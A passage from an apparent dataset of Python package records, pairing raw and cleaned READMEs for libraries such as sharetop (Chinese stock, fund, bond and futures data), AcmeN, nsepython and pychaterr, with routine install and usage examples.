2    000950  重药控股  2023-04-25     2家机构买入，成功率43.67%   7.03  ...  1.737031e+09   3.719371  29.171036  1.214914e+10     连续三个交易日内，涨幅偏离值累计达到20%的证券
3    001269  欧晶科技  2023-04-25     4家机构卖出，成功率47.21%  95.46  ...  6.431845e+08 -11.481581  33.037047  3.279663e+09             日跌幅偏离值达到7%的前5只证券
4    001337  四川黄金  2023-04-25  西藏自治区资金买入，成功率37.01%  41.25  ...  9.748661e+08   1.426310  15.850799  2.475000e+09              日 换手率达到20%的前5只证券
..      ...   ...         ...                  ...    ...  ...           ...        ...        ...           ...                          ...
820  688112  鼎阳科技  2023-04-07     2家机构买入，成功率44.20%  89.56  ...  2.652485e+08 -13.693809  85.027009  2.650262e+09  有价格涨跌幅限制的 日收盘价格涨幅达到15%的前五只证券
821  688197  首药控股  2023-04-07     1家机构买入，成功率42.56%  52.10  ...  7.752080e+07   2.625985  37.326871  2.663924e+09  有价格涨跌幅限制的 日收盘价格涨幅达到15%的前五只证券
822  688292  浩瀚深度  2023-04-07     2家机构买入，成功率42.51%  38.77  ...  2.725678e+08   7.600839  34.555959  1.400885e+09  有价格涨跌幅限制的 日收盘价格涨幅达到15%的前五只证券
823  688525  佰维存储  2023-04-07       买一主买，成功率45.68%  75.30  ...  1.224959e+09   7.171807  23.722308  2.619422e+09  有价格涨跌幅限制的日收盘价格涨幅达到15%的前五只证券
824  688525  佰维存储  2023-04-07       买一主买，成功率45.68%  75.30  ...  1.224959e+09   7.171807  23.722308  2.619422e+09     有价格涨跌幅限制 的日换手率达到30%的前五只证券

[825 rows x 16 columns]
```

- 沪深 A 股股票季度表现

```python
>>> import sharetop as sp
>>> sp.stock.get_all_company_quarterly_report() # 默认为最新季度，亦可指定季度
        股票代码  股票简称                 公告日期          营业收入    营业收入同比增长  营业收入季度环比  ...   净利润季度环比    每股收益      每股净资产  净资产收益率      销售毛利率  每股经营现金流量
0     689009  九号公司  2023-04-27 00:00:00  1.661971e+09  -13.318009  -33.3121  ...  -69.2641  0.2400   6.989759    0.35  28.217862 -0.027784
1     688777  中控技术  2023-04-27 00:00:00  1.445708e+09   47.297685  -39.6880  ...  -71.4405  0.1800  10.750850    1.74  33.329184 -1.447543
2     688619   罗普特  2023-04-27 00:00:00  2.426531e+07  122.454886  -62.9774  ...   89.4008 -0.0900   6.769040   -1.34  29.015660 -0.328464
3     688618  三旺通信  2023-04-27 00:00:00  7.170795e+07   31.499767  -38.2247  ...  -66.1811  0.2300  15.892091    1.45  58.706983 -0.094093
4     688616  西力科技  2023-04-27 00:00:00  5.352820e+07  -23.243255  -65.1878  ...  -85.2866  0.0200   5.085878    0.36  25.904601  0.188316
...      ...   ...                  ...           ...         ...       ...  ...       ...     ...        ...     ...        ...       ...
2486  002772  众兴菌业  2023-04-11 00:00:00  6.229097e+08   27.595337   18.5618  ...  395.5582  0.5042   8.573732    5.69  43.228766  0.642276
2487  688700  东威科技  2023-04-08 00:00:00  2.343187e+08   20.234687  -28.8650  ...  -24.9129  0.3400   6.715296    5.25  45.157212  0.183051
2488  600557  康缘药业  2023-04-08 00:00:00  1.352494e+09   25.390576   10.3734  ...   -7.6349  0.2500   8.374359    2.93  75.100289 -0.103785
2489  600313  农发种业  2023-04-08 00:00:00  1.216816e+09   25.531891  -15.8044  ...  -75.2715  0.0361   1.641364    2.23  10.883559  0.109289
2490  603102  百合股份  2023-04-07 00:00:00  2.319653e+08   58.729728   12.5487  ...   43.5618  0.7000  22.919256    3.10  39.261229  0.160328

[2491 rows x 14 columns]

```

- 股票历史单子流入数据(日级)

```python
>>> import sharetop as sp
>>> sp.stock.get_history_bill('300033')
     [11]:
    股票名称    股票代码          日期        主力净流入        小单净流入        中单净流入        大单净流入  ...  主力净流入占比  小单流入净占 比  中单流入净占比  大单流入净占比  超大单流入净占比     收盘价    涨跌幅
0    同花顺  300033  2022-11-25     882089.0     224019.0   -1106108.0   -5475560.0  ...     0.23     0.06    -0.29    -1.42      1.65   91.70  -0.17
1    同花顺  300033  2022-11-28  -26657991.0   -1271355.0   27929346.0    7247576.0  ...    -7.12    -0.34     7.46     1.94     -9.06   89.77  -2.10
2    同花顺  300033  2022-11-29  -28424729.0   -7268909.0   35693632.0   -5113388.0  ...    -3.41    -0.87     4.28    -0.61     -2.79   95.87   6.80
3    同花顺  300033  2022-11-30   79732027.0  -38462589.0  -41269424.0  -15238245.0  ...     8.88    -4.28    -4.59    -1.70     10.57   98.06   2.28
4    同花顺  300033  2022-12-01  -78911985.0    2884073.0   76027920.0  -66718656.0  ...    -6.96     0.25     6.71    -5.88     -1.08  103.92   5.98
..   ...     ...         ...          ...          ...          ...          ...  ...      ...      ...      ...      ...       ...     ...    ...
97   同花顺  300033  2023-04-20 -111105712.0  -53784144.0  164889856.0  -79994960.0  ...    -3.30    -1.60     4.90    -2.38     -0.93  210.00   6.25
98   同花顺  300033  2023-04-21 -221531232.0  130341040.0   91190176.0  -66933888.0  ...    -8.75     5.15     3.60    -2.64     -6.11  196.20  -6.57
99   同花顺  300033  2023-04-24 -340801376.0  353636016.0  -12834656.0 -180464832.0  ...   -10.56    10.96    -0.40    -5.59     -4.97  185.00  -5.71
100  同花顺  300033  2023-04-25   64723600.0   43360432.0 -108084016.0  -18683920.0  ...     2.03     1.36    -3.40    -0.59      2.62  195.01   5.41
101  同花顺  300033  2023-04-26 -284631712.0  127536400.0  157095328.0   78138048.0  ...    -8.47     3.80     4.68     2.33    -10.80  174.92 -10.30

[102 rows x 15 columns]
```

- 股票最新一个交易日单子流入数据(分钟级)

```python
>>> import sharetop as sp
>>> sp.stock.get_real_time_bill('300033')
      股票名称    股票代码                时间        主力净流入        小单净流入        中单净流入       大单净流入       超大单净流入
0    同花顺  300033  2023-04-26 09:31   -3217110.0     282877.0    2934232.0  -2000281.0   -1216829.0
1    同花顺  300033  2023-04-26 09:32   -2170472.0    1124259.0    1046212.0    155117.0   -2325589.0
2    同花顺  300033  2023-04-26 09:33   -9655528.0    6350780.0    3304748.0  -1823981.0   -7831547.0
3    同花顺  300033  2023-04-26 09:34  -16808716.0    9597965.0    7210752.0  -5368535.0  -11440181.0
4    同花顺  300033  2023-04-26 09:35  -20358486.0   12331063.0    8027424.0  -5877906.0  -14480580.0
..   ...     ...               ...          ...          ...          ...         ...          ...
235  同花顺  300033  2023-04-26 14:56 -282170831.0  124642581.0  157528257.0  77398429.0 -359569260.0
236  同花顺  300033  2023-04-26 14:57 -284631720.0  127536411.0  157095316.0  78138042.0 -362769762.0
237  同花顺  300033  2023-04-26 14:58 -284631720.0  127536411.0  157095316.0  78138042.0 -362769762.0
238  同花顺  300033  2023-04-26 14:59 -284631720.0  127536411.0  157095316.0  78138042.0 -362769762.0
239  同花顺  300033  2023-04-26 15:00 -284631720.0  127536411.0  157095316.0  78138042.0 -362769762.0

[240 rows x 8 columns]
```

### Fund

- 获取基金历史净值信息

```python
>>> import sharetop as sp
>>> sp.fund.get_fund_history('010434')
     日期    单位净值    累计净值   涨跌幅
0    2023-04-26  1.2760  1.2760 -1.15
1    2023-04-25  1.2909  1.2909  -1.5
2    2023-04-24  1.3105  1.3105  0.75
3    2023-04-21  1.3007  1.3007  0.26
4    2023-04-20  1.2973  1.2973  0.02
..          ...     ...     ...   ...
608  2020-10-28  0.9987  0.9987 -0.02
609  2020-10-27  0.9989  0.9989 -0.01
610  2020-10-26  0.9990  0.9990 -0.05
611  2020-10-23  0.9995  0.9995    --
612  2020-10-20  1.0000  1.0000    --

[613 rows x 4 columns]
```

- 获取基金公开持仓信息

```python
>>> import sharetop as sp
>>> # 获取最新公开的持仓数据
>>> sp.fund.get_invest_position('010434')
    基金代码    股票代码  股票简称  持仓占比  较上期变化        公开日期
0  010434  600329   达仁堂  9.52   0.90  2023-03-31
1  010434  600557  康缘药业  9.34  -0.54  2023-03-31
2  010434  600572   康恩贝  6.22  -0.42  2023-03-31
3  010434  300181  佐力药业  5.25  -1.10  2023-03-31
4  010434  600129  太极集团  5.19   0.39  2023-03-31
5  010434  603998  方盛制药  5.09   5.09  2023-03-31
6  010434  002603  以岭药业  5.04   5.04  2023-03-31
7  010434  600535   天士力  4.82   4.82  2023-03-31
8  010434  000989   九芝堂  4.53   4.53  2023-03-31
9  010434  300396  迪瑞医疗  4.42   4.42  2023-03-31
```

- 获取单只基金实时净值估算

```python
>>> import sharetop as sp
>>> sp.fund.get_fund_real_time_god('010434')
基金名称    基金代码    净值估算     涨跌值  估算涨幅              估值时间
0  红土创新医疗保健股票  010434  1.2959  0.0199  1.56  2023-04-27 10:12
```

- 获取单多支基金实时净值估算

```python
>>> import sharetop as sp
>>> sp.fund.get_fund_real_time_god(['010434', '004997'])
基金名称    基金代码    净值估算      涨跌值   估算涨幅              估值时间
0   广发高端制造股票A  004997  2.2639  -0.0126  -0.55  2023-04-27 10:31
1  红土创新医疗保健股票  010434  1.3059   0.0299   2.34  2023-04-27 10:31
```

### Bond

- 可转债整体行情

```python
>>> import sharetop as sp
>>> sp.bond.get_bond_realtime_quotes()
债券代码  债券名称    涨跌幅      最新价       最高       最低       今开  ...     昨日收盘         总市值        流通市值      行情ID 市场类型                 更新时间       最新交易日
0    127082  亚科转债   20.0    120.0    120.0  116.992    118.0  ...  100.000  1390800000  1390800000  0.127082   深A  2023-04-27 10:39:36  2023-04-27
1    113668  N鹿山转  16.51  116.511    118.0  115.485    116.9  ...  100.000           -   610517640  1.113668   沪A  2023-04-27 10:39:42  2023-04-27
2    128100  搜特转债   9.44    69.55   71.257    59.32   62.825  ...   63.550   555023119   555037029  0.128100   深A  2023-04-27 10:39:45  2023-04-27
3    123118  惠城转债   7.48  224.839  234.107    209.5    212.0  ...  209.200   444834968   445107023  0.123118   深A  2023-04-27 10:39:45  2023-04-27
4    123181  亚康转债   5.79  158.067   163.28    155.0    155.0  ...  149.420   412554870   412554870  0.123181   深A  2023-04-27 10:39:45  2023-04-27
..      ...   ...    ...      ...      ...      ...      ...  ...      ...         ...         ...       ...  ...                  ...         ...
501  123185  能辉转债  -2.84  117.753    121.5  116.965    119.9  ...  121.199   409670930   409670930  0.123185   深A  2023-04-27 10:39:45  2023-04-27
502  123116  万兴转债  -4.14   250.08    257.0  245.256    256.0  ...  260.888   511184277   511211785  0.123116   深A  2023-04-27 10:39:45  2023-04-27
503  123152  润禾转债  -4.83  130.057    134.9  129.111    134.7  ...  136.657   380107580   380107580  0.123152   深A  2023-04-27 10:39:45  2023-04-27
504  110058  永鼎转债  -7.04  155.155  164.999  154.181    162.0  ...  166.914           -   404116092  1.110058   沪A  2023-04-27 10:39:44  2023-04-27
505  123046  天铁转债 -16.72  389.318  481.525    387.0  471.441  ...  467.500   227693022   227693022  0.123046   深A  2023-04-27 10:39:45  2023-04-27

[506 rows x 20 columns]
```

- 全部可转债信息

```python
>>> import sharetop as sp
>>> sp.bond.get_bond_base_info_list()
      债券代码   债券名称    正股代码  正股名称  ...                 上市日期                 到期日期   期限(年)
               利率说明
0    118034   晶能转债  688223  晶科能源  ...                 None  2029-04-20 00:00:00       6  本次发行的可转债票面利率为第一年0.20%、第二年0.40%、第三年0.60%、第四年1.5...
1    123196  正元转02  300645  正元智慧  ...                 None  2029-04-18 00:00:00       6  第一年0.20%、第二年0.40%、第三年0.60%、第四年1.50%、第五年1.80%、第...
2    113670  金23转债  603180  金牌厨柜  ...                 None  2029-04-17 00:00:00       6  本次发行的可转债票面利率设定为:第一年0.30%、第二年0.50%、第三年1.00%、第四年...
3    123195  蓝晓转02  300487  蓝晓科技  ...                 None  2029-04-17 00:00:00       6   第一年0.4%,第二年0.6%,第三年1.1%,第四年1.8%,第五 年2.5%,第六年3.0%。
4    123194   百洋转债  301015  百洋医药  ...                 None  2029-04-14 00:00:00       6  第一年0.30%、第二年0.50%、第三年1.00%、第四年1.50%、第五年2.00%、第...
..      ...    ...     ...   ...  ...                  ...                  ...     ...                                                ...
815  110227   赤化转债  600227   圣济堂  ...  2007-10-23 00:00:00  2009-05-25 00:00:00  1.6192  票面利率和付息日期:本次发行的可转债票面利率第一年 为1.5%、第二年为1.8%、第三年为2....
816  126006  07深高债  600548   深高速  ...  2007-10-30 00:00:00  2013-10-09 00:00:00       6                                               None
817  110971   恒源转债  600971  恒源煤电  ...  2007-10-12 00:00:00  2009-12-21 00:00:00  2.2484  票面利率为:第一年年利率1.5%,第二年年利率1.8%,第三年年利率2.1%,第四年年利率2...
818  110567   山鹰转债  600567  山鹰国际  ...  2007-09-17 00:00:00  2010-02-01 00:00:00  2.4055  票面利率和付息日期:本次发行的可转债票面利率第一年为1.4%,第二年为1.7%,第三年为2....
819  110026   中海转债  600026  中远海能  ...  2007-07-12 00:00:00  2008-03-27 00:00:00   0.737  票面利率:第一年为1.84%,第二年为2.05%,第三年为2.26%,第四年为2.47%,第...

[820 rows x 12 columns]
```

- 指定可转债 K 线数据

```python
>>> import sharetop as sp
>>> # 可转债代码（以 东财转3 为例）
>>> bond_code = '123111'
>>> sp.stock.get_history_data(bond_code)
    债券名称    债券代码          日期       开盘       收盘       最高       最低      成交量           成交额    振幅    涨跌幅     涨跌额    换手率
0   东财转3  123111  2021-04-23  130.000  130.000  130.000  130.000  1836427  2.387355e+09  0.00  30.00  30.000  11.62
1   东财转3  123111  2021-04-26  130.353  130.010  133.880  125.110  8610944  1.126033e+10  6.75   0.01   0.010  54.50
2   东财转3  123111  2021-04-27  129.000  129.600  130.846  128.400  1820766  2.357472e+09  1.88  -0.32  -0.410  11.52
3   东财转3  123111  2021-04-28  129.100  130.770  131.663  128.903  1467727  1.921641e+09  2.13   0.90   1.170   9.29
4   东财转3  123111  2021-04-29  130.690  131.208  133.150  130.560  1156934  1.525974e+09  1.98   0.33   0.438   7.32
..   ...     ...         ...      ...      ...      ...      ...      ...           ...   ...    ...     ...    ...
72  东财转3  123111  2021-08-09  159.600  159.300  162.990  158.690   596124  9.585751e+08  2.69  -0.34  -0.550   3.77
73  东财转3  123111  2021-08-10  159.190  160.950  161.450  157.000   517237  8.234596e+08  2.79   1.04   1.650   3.27
74  东财转3  123111  2021-08-11  161.110  159.850  162.300  159.400   298906  4.800711e+08  1.80  -0.68  -1.100   1.89
75  东财转3  123111  2021-08-12  159.110  158.290  160.368  158.010   270641  4.298100e+08  1.48  -0.98  -1.560   1.71
76  东财转3  123111  2021-08-13  158.000  158.358  160.290  157.850   250059  3.975513e+08  1.54   0.04   0.068   1.58

[77 rows x 13 columns]
```

- 国债发行

```python
>>> import sharetop as sp
>>> start_date = '20230407' # 开始日期
>>> end_date = '20230425' # 结束日期
>>> sp.bond.bond_treasure_issue_cninfo(start_date, end_date)
    债券代码      债券简称  ...        公告日期                债券名称
0   019697    23国债04  ...  2023-04-26    2023年记账式附息(四期)国债
1   102232    国债2304  ...  2023-04-26    2023年记账式附息(四期)国债
2   230004  23附息国债04  ...  2023-04-26    2023年记账式附息(四期)国债
3   019703    23国债10  ...  2023-04-17    2023年记账式附息(十期)国债
4   102238    国债2310  ...  2023-04-17    2023年记账式附息(十期)国债
5   230010  23附息国债10  ...  2023-04-17    2023年记账式附息(十期)国债
6   020561    23贴债23  ...  2023-04-14  2023年记账式贴现(二十三期)国债
7   108561    贴债2323  ...  2023-04-14  2023年记账式贴现(二十三期)国债
8   239923  23贴现国债23  ...  2023-04-14  2023年记账式贴现(二十三期)国债
9   020562    23贴债24  ...  2023-04-20  2023年记账式贴现(二十四期)国债
10  108562    贴债2324  ...  2023-04-20  2023年记账式贴现(二十四期)国债
11  239924  23贴现国债24  ...  2023-04-20  2023年记账式贴现(二十四期)国债
12  019696    23国债03  ...  2023-04-24    2023年记账式附息(三期)国债
13  102231    国债2303  ...  2023-04-24    2023年记账式附息(三期)国债
14  230003  23附息国债03  ...  2023-04-24    2023年记账式附息(三期)国债
15  019699    23国债06  ...  2023-04-24    2023年记账式附息(六期)国债
16  102234    国债2306  ...  2023-04-24    2023年记账式附息(六期)国债
17  230006  23附息国债06  ...  2023-04-24    2023年记账式附息(六期)国债

[18 rows x 15 columns]

```


### Futures

- 获取交易所期货基本信息

```python
>>> import sharetop as sp
>>> sp.futures.get_futures_base_info()
       期货代码     期货名称        行情ID 市场类型
0    wr2310   线材2310  113.wr2310  上期所
1     SM307    锰硅307   115.SM307  郑商所
2    fb2307  纤维板2307  114.fb2307  大商所
3       SMM     锰硅主力     115.SMM  郑商所
4     SM306    锰硅306   115.SM306  郑商所
..      ...      ...         ...  ...
881  jm2310   焦煤2310  114.jm2310  大商所
882  jm2308   焦煤2308  114.jm2308  大商所
883  jm2307   焦煤2307  114.jm2307  大商所
884     jms    焦煤次主力     114.jms  大商所
885  jm2305   焦煤2305  114.jm2305  大商所

[886 rows x 4 columns]
```

- 获取期货历史行情

```python
>>> import sharetop as sp
>>> # 获取全部期货行情ID列表
>>> quote_ids = sp.futures.get_realtime_quotes()['行情ID']
>>> # 指定单个期货的行情ID(以上面获得到的行情ID列表为例)
>>> quote_id = quote_ids[0]
>>> # 查看第一个行情ID
>>> quote_ids[0]
'113.wr2310'
>>> # 获取第行情ID为第一个的期货日 K 线数据
>>> sp.futures.get_history_data(quote_id)
       期货名称    期货代码          日期    开盘    收盘    最高    最低  成交量     成交额    振幅   涨跌幅    涨跌额  换手率
0  线材2310  wr2310  2022-11-14  4065  4350  4350  4065    4  168300  0.00  0.00    0.0  0.0
1  线材2310  wr2310  2022-11-28  4401  4151  4401  4151    2   85520  5.94 -1.33  -56.0  0.0
2  线材2310  wr2310  2023-04-07  4582  4582  4582  4582    5  229100  0.00  7.16  306.0  0.0
3  线材2310  wr2310  2023-04-13  4582  4582  4582  4582    1   45820  0.00  0.00    0.0  0.0
4  线材2310  wr2310  2023-04-24  4445  4260  4445  4260    2   87050  4.04 -7.03 -322.0  0.0
5  线材2310  wr2310  2023-04-25  4468  4390  4468  4213   10  434890  5.86  0.87   38.0  0.0
6  线材2310  wr2310  2023-04-26  4253  4253  4253  4253    1   42530  0.00 -2.18  -95.0  0.0
7  线材2310  wr2310  2023-04-27  4587  4587  4587  4587    1   45870  0.00  7.85  334.0  0.0

>>> # 指定多个期货的 行情ID
>>> quote_ids = ['115.ZCM','115.ZC109']
>>> futures_df = sp.futures.get_history_data(quote_ids)
>>> type(futures_df)

>>> futures_df['115.ZCM']
       期货名称 期货代码          日期     开盘     收盘     最高     最低    成交量           成交额    振幅   涨跌幅   涨跌额  换手率
0     动力煤主力  ZCM  2015-05-18  440.0  437.6  440.2  437.6     64  2.806300e+06  0.00  0.00   0.0  0.0
1     动力煤主力  ZCM  2015-05-19  436.0  437.0  437.6  436.0      6  2.621000e+05  0.36 -0.32  -1.4  0.0
2     动力煤主力  ZCM  2015-05-20  436.8  435.8  437.0  434.8      8  3.487500e+05  0.50 -0.23  -1.0  0.0
3     动力煤主力  ZCM  2015-05-21  438.0  443.2  446.8  437.8     37  1.631850e+06  2.06  1.65   7.2  0.0
4     动力煤主力  ZCM  2015-05-22  439.2  441.4  443.8  439.2     34  1.502500e+06  1.04  0.09   0.4  0.0
...     ...  ...         ...    ...    ...    ...    ...    ...           ...   ...   ...   ...  ...
1524  动力煤主力  ZCM  2021-08-17  755.0  770.8  776.0  750.6  82373  6.288355e+09  3.25 -1.26  -9.8  0.0
1525  动力煤主力  ZCM  2021-08-18  770.8  776.8  785.8  766.0  77392  6.016454e+09  2.59  1.76  13.4  0.0
1526  动力煤主力  ZCM  2021-08-19  776.8  777.6  798.0  764.6  97229  7.597474e+09  4.30  0.03   0.2  0.0
1527  动力煤主力  ZCM  2021-08-20  778.0  793.0  795.0  775.2  70549  5.553617e+09  2.53  1.48  11.6  0.0
1528  动力煤主力  ZCM  2021-08-23  796.8  836.6  843.8  796.8  82954  6.850341e+09  5.97  6.28  49.4  0.0

[1529 rows x 13 columns]
```


## Contact

[![Github](https://img.shields.io/badge/Github-blue?style=social&logo=github)](https://github.com/nrliangxy)
[![Email](https://img.shields.io/badge/Email-blue)](mailto:nrliangxy@foxmail.com)
",nrliangxy/sharetop
vault2secretsmanager,https://github.com/tmb28054/vault2secretsmanager,2,258,258,"# Vault Sync
A systemd service which will replicate secrets in vault to secrets manager.

## how to install
`pip install -U vault2secretsmanager`

## how to setup
`vault2secretsmanager setup`

## requirements
- python3.8 or greater
- a systemd unix server


","# Vault Sync
A systemd service which will replicate secrets in vault to secrets manager.

## how to install
`pip install -U vault2secretsmanager`

## how to setup
`vault2secretsmanager setup`

## requirements
- python3.8 or greater
- a systemd unix server


",tmb28054/vault2secretsmanager
acmen,https://github.com/CBPJ/AcmeN,5,1129,1113,"# AcmeN

AcmeN is an ACME([RFC8555](https://tools.ietf.org/html/rfc8555)) client implemented in Python.

**Note:** AcmeN is still under actively development, there will be some breaking changes until the first stable version v1.0.0 is released. Please keep an eye on the change log.

## Quick Start

Install AcmeN using pip:

```shell
pip install acmen
```

Generate account key using openssl:

```shell
openssl ecparam -genkey -noout -name secp384r1 -out account.key
```

Create a python file named `main.py` as follows and modify necessary parameters:

```python
import logging
from acmen import AcmeN
from acmen.handlers import CloudflareDnsHandler

logging.basicConfig(level=logging.INFO)
acme = AcmeN('account.key')
handler = CloudflareDnsHandler('<your_api_token>')
acme.register_account(contact=['mailto:you@your-mail-provider.tld'])
acme.get_cert_by_domain('example.com', ['www.example.com', 'alt1.example.com'], handler)
```

After a few seconds, you will get your certificate and key file in the working directory.

For more information, please refer to [AcmeN docs](https://cbpj.github.io/AcmeN/).(Chinese Simplified)
","# AcmeN

AcmeN is an ACME([RFC8555](https://tools.ietf.org/html/rfc8555)) client implemented in Python.

**Note:** AcmeN is still under actively development, there will be some breaking changes until the first stable version v1.0.0 is released. Please keep an eye on the change log.

## Quick Start

Install AcmeN using pip:

```shell
pip install acmen
```

Generate account key using openssl:

```shell
openssl ecparam -genkey -noout -name secp384r1 -out account.key
```

Create a python file named `main.py` as follows and modify necessary parameters:

```python
import logging
from acmen import AcmeN
from acmen.handlers import CloudflareDnsHandler

logging.basicConfig(level=logging.INFO)
acme = AcmeN('account.key')
handler = CloudflareDnsHandler('')
acme.register_account(contact=['mailto:you@your-mail-provider.tld'])
acme.get_cert_by_domain('example.com', ['www.example.com', 'alt1.example.com'], handler)
```

After a few seconds, you will get your certificate and key file in the working directory.

For more information, please refer to [AcmeN docs](https://cbpj.github.io/AcmeN/).(Chinese Simplified)
",cbpj/acmen
allianceauth-site-claim,https://github.com/Solar-Helix-Independent-Transport/allianceauth-site-claim,0,677,677,"# Site Claim

## Installation install from pypi or git

- Install the app and pre-reqs

```
    pip install allianceauth-site-claim

or

    pip install git+https://github.com/Solar-Helix-Independent-Transport/allianceauth-site-claim.git
```

- add `'siteclaim',`
  and `'solo',` ( if its not already there )
  to your local.py
- migrate
- restart auth and authbot

## Settings

| Setting                   | Default | What it does                    |
| ------------------------- | ------- | ------------------------------- |
| `SITE_CLAIM_ENABLE_SITES` | True    | Enable or disable the Sites Cog |
| `SITE_CLAIM_ENABLE_ESS`   | True    | Enable or disable the ESS Cog   |


","# Site Claim

## Installation install from pypi or git

- Install the app and pre-reqs

```
    pip install allianceauth-site-claim

or

    pip install git+https://github.com/Solar-Helix-Independent-Transport/allianceauth-site-claim.git
```

- add `'siteclaim',`
  and `'solo',` ( if its not already there )
  to your local.py
- migrate
- restart auth and authbot

## Settings

| Setting                   | Default | What it does                    |
| ------------------------- | ------- | ------------------------------- |
| `SITE_CLAIM_ENABLE_SITES` | True    | Enable or disable the Sites Cog |
| `SITE_CLAIM_ENABLE_ESS`   | True    | Enable or disable the ESS Cog   |


",solar-helix-independent-transport/allianceauth-site-claim
nsepythonserver,https://github.com/aeron7/nsepython,3,1682,1257,"<p align=""left"">
  <a href=""https://aeron7.github.io/nsepython/"" target=""_blank"">
    <img width=""300"" src=""https://github.com/aeron7/nsepython/blob/master/nsepython.png"" alt=""logo"">
  </a>
</p>

#### NSEPython is a Python library to get publicly available data on the current [NSEIndia](https://nseindia.com) and [NIFTY Indices](https://www.niftyindices.com/) site by communicating with their REST APIs.

<p align=""left"">
  <a href=""https://unofficed.com/nse-python/documentation/"" target=""_blank"">
    <img width=""200"" src=""https://github.com/aeron7/nsepython/blob/master/button_read-the-documentation.png"" alt=""logo"">
  </a>
</p>

For Support and Beta Functions - [https://forum.unofficed.com/t/nsepython-documentation/376/107](https://forum.unofficed.com/t/nsepython-documentation/376/107)

## Installation

Use the package manager [pip](https://pypi.org/project/nsepython/) to install nsepython.

```bash
pip install nsepython
```
## Cross Library Migration
All the functions of the two famous packages NsepY and NSETools are also migrated here with same function name. <br/>
They were both unmaintained since long time.

## Advanced Usecases
[Calculate any Option Greek using Black Scholes Formula in Python](https://unofficed.com/black-scholes-formula-in-python/)

[ How to find the beta of Indian stocks using Python?](https://unofficed.com/how-to-find-the-beta-of-indian-stocks-using-python/)

[How to get Historical PE, PB and Dividend Ratio of any index using Python](https://unofficed.com/nse-python/documentation/nsepy/#index_pe_pb_div)

## Contributing
For Discussion and Improving this Code, Join - https://www.unofficed.com/chat/
","





#### NSEPython is a Python library to get publicly available data on the current [NSEIndia](https://nseindia.com) and [NIFTY Indices](https://www.niftyindices.com/) site by communicating with their REST APIs.







For Support and Beta Functions - [https://forum.unofficed.com/t/nsepython-documentation/376/107](https://forum.unofficed.com/t/nsepython-documentation/376/107)

## Installation

Use the package manager [pip](https://pypi.org/project/nsepython/) to install nsepython.

```bash
pip install nsepython
```
## Cross Library Migration
All the functions of the two famous packages NsepY and NSETools are also migrated here with same function name. 
They were both unmaintained since long time.

## Advanced Usecases
[Calculate any Option Greek using Black Scholes Formula in Python](https://unofficed.com/black-scholes-formula-in-python/)

[ How to find the beta of Indian stocks using Python?](https://unofficed.com/how-to-find-the-beta-of-indian-stocks-using-python/)

[How to get Historical PE, PB and Dividend Ratio of any index using Python](https://unofficed.com/nse-python/documentation/nsepy/#index_pe_pb_div)

## Contributing
For Discussion and Improving this Code, Join - https://www.unofficed.com/chat/
",aeron7/nsepython
the-lord-of-the-rings-sdk-danilredko,https://github.com/danilredko/DANIL-REDKO-SDK,1,0,0,,,danilredko/danil-redko-sdk
acnawebcli,https://github.com/acnaweb/cli-tools,0,1260,1260,"# Welcome to cli-tools

![version](https://img.shields.io/badge/version-0.1.0-blue.svg?cacheSeconds=2592000) 
![licence](https://img.shields.io/badge/licence-MIT-green.svg?cacheSeconds=2592000)

This is a Python library for testing

## Installation

`acnawebcli` supports Python 3.8 and higher.

### System-wide or user-wide installation with pipx

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install `acnawebcli`.

```bash
$ pip install acnawebcli
```

## Usage

```python


```

## Developing

Development requires Python 3.8+; otherwise you'll get false positive type failures.

To work on the `acnawebcli` code: pull the repository, create and activate a virtualenv, then run:

```bash
make dev
```

Testing

```bash
make test
```

Publish

```bash
make push
```

## Author

👤 **Antonio Carlos de Lima Junior**

* Website: https://www.linkedin.com/in/acnaweb/
* Github: [@acnaweb](https://github.com/acnaweb)
* LinkedIn: [@acnaweb](https://linkedin.com/in/acnaweb)


## References

- [Pypi Classifiers](https://pypi.org/classifiers/)
- [Python Packaging Tutorial](https://www.devdungeon.com/content/python-packaging-tutorial)
- [A Practical Guide to Using Setup.py](https://godatadriven.com/blog/a-practical-guide-to-using-setup-py/)

","# Welcome to cli-tools

![version](https://img.shields.io/badge/version-0.1.0-blue.svg?cacheSeconds=2592000) 
![licence](https://img.shields.io/badge/licence-MIT-green.svg?cacheSeconds=2592000)

This is a Python library for testing

## Installation

`acnawebcli` supports Python 3.8 and higher.

### System-wide or user-wide installation with pipx

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install `acnawebcli`.

```bash
$ pip install acnawebcli
```

## Usage

```python


```

## Developing

Development requires Python 3.8+; otherwise you'll get false positive type failures.

To work on the `acnawebcli` code: pull the repository, create and activate a virtualenv, then run:

```bash
make dev
```

Testing

```bash
make test
```

Publish

```bash
make push
```

## Author

👤 **Antonio Carlos de Lima Junior**

* Website: https://www.linkedin.com/in/acnaweb/
* Github: [@acnaweb](https://github.com/acnaweb)
* LinkedIn: [@acnaweb](https://linkedin.com/in/acnaweb)


## References

- [Pypi Classifiers](https://pypi.org/classifiers/)
- [Python Packaging Tutorial](https://www.devdungeon.com/content/python-packaging-tutorial)
- [A Practical Guide to Using Setup.py](https://godatadriven.com/blog/a-practical-guide-to-using-setup-py/)

",acnaweb/cli-tools
pychaterr,https://github.com/omab/pychaterr,1,1027,1027,"# PyChatErr

Python global error handler powered by ChatGPT to enhance errors resolutions.

# Description

PyChatErr installs a global exception handler that will send the cached
exception and related code to ChatGPT completion engine asking it to explain the
issue and propose solutions.

# Installation

Install using `pip`:

```shell
pip install pychaterr
```

# Usage

This module requires a OpenAI API Key:

1. Generate a key at https://platform.openai.com/account/api-keys
2. Export it with:
   ```
   export OPENAPI_API_KEY=sk-...
   ```

Then import the module in your code with:

```python
import pychaterr
```

# Demo

[![asciicast](https://asciinema.org/a/as6OC8KH0Oe6w78Yw10TexmsV.svg)](https://asciinema.org/a/as6OC8KH0Oe6w78Yw10TexmsV)

# Examples

The [examples/](examples/) folder contains examples showing this module behavior.

Run the samples with:

```shell
# Create and activate a virtual environment
pip install -e .
python examples/zerodivision.py
```

# License

See [LICENSE](LICENSE) file for details.","# PyChatErr

Python global error handler powered by ChatGPT to enhance errors resolutions.

# Description

PyChatErr installs a global exception handler that will send the cached
exception and related code to ChatGPT completion engine asking it to explain the
issue and propose solutions.

# Installation

Install using `pip`:

```shell
pip install pychaterr
```

# Usage

This module requires a OpenAI API Key:

1. Generate a key at https://platform.openai.com/account/api-keys
2. Export it with:
   ```
   export OPENAPI_API_KEY=sk-...
   ```

Then import the module in your code with:

```python
import pychaterr
```

# Demo

